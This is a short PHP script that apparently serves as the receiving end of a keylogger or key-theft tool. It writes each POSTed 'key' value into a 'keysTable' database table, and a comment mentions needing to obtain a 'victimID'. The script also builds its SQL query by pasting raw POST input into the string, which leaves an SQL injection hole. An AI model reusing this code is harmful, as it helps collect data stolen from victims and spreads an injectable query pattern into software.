<html>
<?php
require 'connect.php';
if ($_POST){
    # need to find way of getting victimID
    $sql = "INSERT INTO keysTable VALUES(NULL,'".$_POST['key']."', '1','2022-08-22 08:56:39')";
    $result = $conn->query($sql);

    $conn->close();
}
flush();
exit();
?>
</html>